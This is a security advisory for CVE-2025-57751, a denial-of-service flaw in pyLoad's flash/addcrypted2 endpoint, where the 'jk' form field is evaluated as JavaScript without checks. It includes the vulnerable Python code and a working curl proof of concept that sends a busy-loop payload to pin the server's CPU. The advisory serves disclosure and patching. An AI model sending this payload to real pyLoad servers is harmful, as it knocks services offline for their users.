# [H] Denial-of-Service attack in pyLoad CNL Blueprint using dukpy.evaljs

## Summary
Severity: High
Advisory: GHSA-9gjj-6gj7-c4wj
CVE: CVE-2025-57751
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-08-21
Source: https://github.com/advisories/GHSA-9gjj-6gj7-c4wj
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev92

## Details
Dear Maintainers,
I am writing to you on behalf of the Tencent AI Sec. We have identified a potential vulnerability in one of your products and would like to report it to you for further investigation and mitigation.

### Summary
The `jk` parameter is received in pyLoad CNL Blueprint. Due to the lack of `jk` parameter verification, the `jk` parameter input by the user is directly determined as dykpy.evaljs(), resulting in the server CPU being fully occupied and the web-ui becoming unresponsive.

### Details
- Endpoint: flash/addcrypted2
- affected file: https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py#L123
https://github.com/pyload/pyload/blob/develop/src/pyload/core/utils/misc.py#L42	

affected code
```python
@bp.route("/flash/addcrypted2", methods=["POST"], endpoint="addcrypted2")
@local_check
def addcrypted2():
    package = flask.request.form.get(
        "package", flask.request.form.get("source", flask.request.form.get("referer"))
    )
    crypted = flask.request.form["crypted"]
    jk = flask.request.form["jk"]
    pack_password = flask.request.form.get("passwords")

    crypted = standard_b64decode(unquote(crypted.replace(" ", "+")))
    jk = eval_js(f"{jk} f()")

```

```python
def eval_js(script, es6=False):
    if sys.version_info < (3, 12):
        return (js2py.eval_js6 if es6 else js2py.eval_js)(script)
    else:
        return dukpy.evaljs(script)
```

### PoC
download pyload and run locally, send the following request
- PoC
```shell
curl -X POST "http://localhost:8000/flash/addcrypted2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crypted=SGVsbG8gd29ybGQ=" \
  -d "passwords=pyload" \
  -d "jk=const start = Date.now();%0Awhile (Date.now() - start < 30_000) {} //"
```
The 30_000 can be modified to any large value.


### Impact
System resources are exhausted, causing services to be temporarily interrupted or stopped, making them inaccessible to normal users.

Use the following command to check CPU usage
```shell
top -pid $(pgrep -f "pyload.__main__") 
```
or
```shell
top -pid $(pgrep -f "pyload") 
```

The CPU is fully occupied
<img width="1209" height="134" alt="image" src="https://github.com/user-attachments/assets/5f9338fe-90c8-4e99-bd8e-a5b5c5a81a6e" />

web-ui unresponsive
<img width="1209" height="496" alt="image" src="https://github.com/user-attachments/assets/7100cdb6-e4d5-4d0c-a138-51b08a7b1fbd" />

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-9gjj-6gj7-c4wj
- https://nvd.nist.gov/vuln/detail/CVE-2025-57751
- https://github.com/pyload/pyload
